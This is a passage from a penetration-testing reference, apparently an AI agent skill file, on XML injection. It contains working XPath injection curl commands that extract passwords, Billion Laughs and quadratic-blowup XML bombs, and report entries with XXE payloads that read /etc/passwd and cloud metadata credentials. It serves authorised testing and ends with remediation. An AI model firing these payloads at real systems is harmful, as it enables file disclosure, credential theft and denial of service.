# testing-for-xml-injection-vulnerabilities — 详细参考（由 SKILL.md 拆分）

# XPath data extraction
curl "http://target.com/search?query=' or 1=1 or ''='"

# Blind XPath injection with boolean-based extraction
curl "http://target.com/search?query=' or string-length(//user[1]/password)=8 or ''='"
curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' or ''='"
```

### Step 6 — Test for XML Billion Laughs (DoS)
```xml
<!-- Billion Laughs attack (use only in authorized testing) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root><data>&lol4;</data></root>

<!-- Quadratic blowup attack -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| XXE (XML External Entity) | Attack exploiting XML parsers that process external entity references |
| Blind XXE | XXE where response is not reflected; requires out-of-band channels |
| XPath Injection | Injection into XPath queries used to navigate XML documents |
| DTD (Document Type Definition) | Declarations that define XML document structure and entities |
| Parameter Entities | Special entities (%) used within DTDs for blind XXE exploitation |
| SSRF via XXE | Using XXE to make server-side requests to internal resources |
| XML Bomb | Denial of service via recursive entity expansion (Billion Laughs) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy with XXE Scanner extension for automated detection |
| XXEinjector | Automated XXE injection and data exfiltration tool |
| OXML_XXE | Tool for embedding XXE payloads in Office XML documents |
| xmllint | XML validation and parsing utility for payload testing |
| interact.sh | Out-of-band interaction server for blind XXE detection |
| Content Type Converter | Burp extension to convert JSON requests to XML for XXE testing |

## Common Scenarios

1. **File Disclosure** — Read sensitive server files (/etc/passwd, web.config) through classic XXE entity injection in XML input fields
2. **SSRF to Cloud Metadata** — Access AWS/GCP/Azure metadata endpoints through XXE to steal IAM credentials and access tokens
3. **Blind Data Exfiltration** — Extract sensitive data through out-of-band DNS/HTTP channels when XXE output is not reflected
4. **SAML XXE** — Inject XXE payloads into SAML assertions during single sign-on authentication flows
5. **SVG File Upload XXE** — Upload malicious SVG files containing XXE payloads to trigger server-side XML parsing

## Output Format

```
## XML Injection Assessment Report
- **Target**: http://target.com/api/xml-endpoint
- **Vulnerability Types Found**: XXE, Blind XXE, XPath Injection
- **Severity**: Critical

### Findings
| # | Type | Endpoint | Payload | Impact |
|---|------|----------|---------|--------|
| 1 | XXE File Read | POST /api/import | SYSTEM "file:///etc/passwd" | Local File Disclosure |
| 2 | Blind XXE | POST /api/upload | External DTD with OOB | Data Exfiltration |
| 3 | SSRF via XXE | POST /api/parse | SYSTEM "http://169.254.169.254/" | Cloud Credential Theft |

### Remediation
- Disable external entity processing in XML parser configuration
- Use JSON instead of XML where possible
- Implement XML schema validation with strict DTD restrictions
- Block outbound connections from XML processing services
```
